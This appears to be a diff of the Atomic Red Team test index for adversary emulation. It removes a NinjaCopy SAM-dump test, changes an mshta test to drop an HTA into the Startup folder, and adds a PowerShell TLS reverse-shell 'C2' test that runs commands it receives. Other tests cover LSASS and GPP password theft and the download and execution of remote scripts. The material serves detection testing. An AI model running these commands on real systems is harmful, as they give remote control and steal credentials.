-        prereq_command: 'if (Test-Path #{procdump_exe}) {0} else {1}'
+        prereq_command: 'if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
           Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
@@ -20013,7 +19961,7 @@ credential-access:
       dependencies:
       - description: Computer must be domain joined
         prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
-          {0} else {1}
+          {exit 0} else {exit 1}
         get_prereq_command: Write-Host Joining this computer to a domain must be done
           manually
       executor:
@@ -20041,13 +19989,14 @@ credential-access:
       dependency_executor_name: powershell
       dependencies:
       - description: 'Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}'
-        prereq_command: if(Test-Path "#{gpp_script_path}") { 0 } else { 1 }
+        prereq_command: if(Test-Path "#{gpp_script_path}") {exit 0 } else {exit 1
+          }
         get_prereq_command: |-
           New-Item -ItemType Directory (Split-Path "#{gpp_script_path}") -Force | Out-Null
           Invoke-WebRequest #{gpp_script_url} -OutFile "#{gpp_script_path}"
       - description: Computer must be domain joined
         prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
-          {0} else {1}
+          {exit 0} else {exit 1}
         get_prereq_command: Write-Host Joining this computer to a domain must be done
           manually
       executor:
@@ -20056,44 +20005,6 @@ credential-access:
         command: |
           . #{gpp_script_path}
           Get-GPPPassword -Verbose
-    - name: Dump SAM, SECURITY and SYSTEM files using NinjaCopy PowerShell script
-      description: |
-        This test uses PowerShell to copy SAM, SECURITY and SYSTEM files from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.
-        Credit to Joe Bialek (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)
-      supported_platforms:
-      - windows
-      input_arguments:
-        ninjacopy_script_path:
-          description: Path to the Invoke-NinjaCopy PowerShell script
-          type: Path
-          default: PathToAtomicsFolder\T1003\src\Invoke-NinjaCopy.ps1
-        ninjacopy_script_url:
-          description: URL of the Invoke-NinjaCopy PowerShell Script
-          type: url
-          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/6b0ada999a9d2be8c6c9267da57b898494d13219/Exfiltration/Invoke-NinjaCopy.ps1
-        output_folder:
-          description: Output folder path
-          type: Path
-          default: C:\Windows\Temp
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'Invoke-NinjaCopy PowerShell Script must exist at #{ninjacopy_script_path}'
-        prereq_command: if(Test-Path "#{ninjacopy_script_path}") { 0 } else { 1 }
-        get_prereq_command: |-
-          New-Item -ItemType Directory (Split-Path "#{ninjacopy_script_path}") -Force | Out-Null
-          Invoke-WebRequest #{ninjacopy_script_url} -OutFile "#{ninjacopy_script_path}"
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          . #{ninjacopy_script_path}
-          Invoke-NinjaCopy -Path "%systemroot%\System32\sam" -LocalDestination "#{output_folder}\sam"
-          Invoke-NinjaCopy -Path "%systemroot%\System32\system" -LocalDestination "#{output_folder}\system"
-          Invoke-NinjaCopy -Path "%systemroot%\System32\security" -LocalDestination "#{output_folder}\security"
-        cleanup_command: |
-          del "#{output_folder}\sam" >nul 2> nul
-          del "#{output_folder}\system" >nul 2> nul
-          del "#{output_folder}\security" >nul 2> nul
     - name: LSASS read with pypykatz
       description: |
         Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::
@@ -22181,11 +22092,17 @@ execution:
           description: URL to HTA file for execution
           type: string
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta
+        temp_file:
+          description: temp_file location for hta
+          type: string
+          default: "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1170.hta"
       executor:
-        name: command_prompt
-        command: 'mshta #{hta_url}
-
-'
+        name: powershell
+        command: |
+          $var =Invoke-WebRequest "#{hta_url}"
+          $var.content|out-file "#{temp_file}"
+          mshta "#{temp_file}"
+        cleanup_command: "remove-item \"#{temp_file}\" \n"
   T1086:
     technique:
       x_mitre_permissions_required:
@@ -22502,8 +22419,8 @@ execution:
       - windows
       dependencies:
       - description: PowerShell version 2 must be installed
-        prereq_command: if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {0} else
-          {1}
+        prereq_command: if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {exit
+          0} else {exit 1}
         get_prereq_command: Write-Host  Automated installer not implemented yet, please
           install PowerShell v2 manually
       executor:
@@ -22527,7 +22444,7 @@ execution:
       dependencies:
       - description: Homedrive must be an NTFS drive
         prereq_command: if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem
-          -contains "NTFS") {0} else {1}
+          -contains "NTFS") {exit 0} else {exit 1}
         get_prereq_command: Write-Host Prereq's for this test cannot be met automatically
       executor:
         name: powershell
@@ -23314,7 +23231,7 @@ execution:
       dependencies:
       - description: PsExec tool from Sysinternals must exist on disk at specified
           location (#{psexec_exe})
-        prereq_command: if (Test-Path "#{psexec_exe}"") {0} else {1}
+        prereq_command: if (Test-Path "#{psexec_exe}"") { exit 0} else { exit 1}
         get_prereq_command: |-
           Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
           Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
@@ -25097,7 +25014,7 @@ lateral-movement:
       dependencies:
       - description: Computer must be domain joined
         prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
-          {0} else {1}
+          { exit 0} else { exit 1}
         get_prereq_command: Write-Host Joining this computer to a domain must be done
           manually
       executor:
@@ -27895,6 +27812,103 @@ command-and-control:
         command: |
           Set-Location $PathToAtomicsFolder
           .\T1071\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
+  T1032:
+    technique:
+      x_mitre_data_sources:
+      - Packet capture
+      - Netflow/Enclave netflow
+      - Malware reverse engineering
+      - Process use of network
+      - Process monitoring
+      - SSL/TLS inspection
+      name: Standard Cryptographic Protocol
+      description: Adversaries may explicitly employ a known encryption algorithm
+        to conceal command and control traffic rather than relying on any inherent
+        protections provided by a communication protocol. Despite the use of a secure
+        algorithm, these implementations may be vulnerable to reverse engineering
+        if necessary secret keys are encoded and/or generated within malware samples/configuration
+        files.
+      id: attack-pattern--4b74a1d4-b0e9-4ef1-93f1-14ecc6e2f5b5
+      x_mitre_platforms:
+      - Linux
+      - macOS
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: |-
+        SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels. (Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation. (Citation: SEI SSL Inspection Risks)
+
+        If malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures. (Citation: Fidelis DarkComet)
+
+        In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_network_requirements: true
+      created: '2017-05-31T21:30:35.334Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: command-and-control
+      external_references:
+      - external_id: T1032
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1032
+      - source_name: SANS Decrypting SSL
+        description: Butler, M. (2013, November). Finding Hidden Threats by Decrypting
+          SSL. Retrieved April 5, 2016.
+        url: http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840
+      - source_name: SEI SSL Inspection Risks
+        description: Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved
+          April 5, 2016.
+        url: https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html
+      - source_name: Fidelis DarkComet
+        description: Fidelis Cybersecurity. (2015, August 4). Looking at the Sky for
+          a DarkComet. Retrieved April 5, 2016.
+        url: https://www.fidelissecurity.com/sites/default/files/FTA_1018_looking_at_the_sky_for_a_dark_comet.pdf
+      - source_name: University of Birmingham C2
+        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
+          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
+        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
+      modified: '2019-07-19T18:55:09.403Z'
+      identifier: T1032
+    atomic_tests:
+    - name: OpenSSL C2
+      description: |
+        Thanks to @OrOneEqualsOne for this quick C2 method.
+        This is to test to see if a C2 session can be established using an SSL socket.
+        More information about this technique, including how to set up the listener, can be found here:
+        https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926
+      supported_platforms:
+      - windows
+      input_arguments:
+        server_ip:
+          description: IP of the external server
+          type: String
+          default: 127.0.0.1
+        server_port:
+          description: The port to connect to on the external server
+          type: String
+          default: 443
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $server_ip = #{server_ip}
+          $server_port = #{server_port}
+          $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', #{server_port})
+          $stream = $socket.GetStream()
+          $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
+          $sslStream.AuthenticateAsClient('fake.domain', $null, "Tls12", $false)
+          $writer = new-object System.IO.StreamWriter($sslStream)
+          $writer.Write('PS ' + (pwd).Path + '> ')
+          $writer.flush()
+          [byte[]]$bytes = 0..65535|%{0};
+          while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
+          {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+          $sendback = (iex $data | Out-String ) 2>&1;
+          $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+          $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+          $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
   T1065:
     technique:
       x_mitre_data_sources:
